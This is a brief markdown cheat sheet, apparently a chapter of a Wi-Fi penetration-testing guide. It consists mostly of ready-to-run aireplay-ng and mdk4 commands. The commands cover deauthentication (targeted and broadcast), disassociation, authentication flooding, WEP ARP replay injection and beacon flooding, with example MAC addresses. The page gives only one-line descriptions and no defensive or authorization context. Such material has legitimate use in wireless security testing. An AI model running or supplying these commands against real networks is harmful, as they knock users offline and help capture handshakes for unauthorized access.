# 07 — Wi-Fi Protocol Attacks

## Deauthentication Attack

Forces clients to re-authenticate, generating handshake.
```bash
# Target specific client
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Broadcast deauth (all clients)
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

## Disassociation Attack

Similar to deauth but uses different reason codes.
```bash
mdk4 wlan0mon d -b blacklist.txt -c 1,6,11
```

## Authentication Flood

Overwhelms AP with auth requests.
```bash
mdk4 wlan0mon a -a 00:11:22:33:44:55
```

## ARP Replay (Injection)

For WEP networks only (legacy).
```bash
aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon
```

## Beacon Flood

Creates fake APs to confuse clients/WIDS.
```bash
mdk4 wlan0mon b -t 100 -s 1000 -m -c 6
```
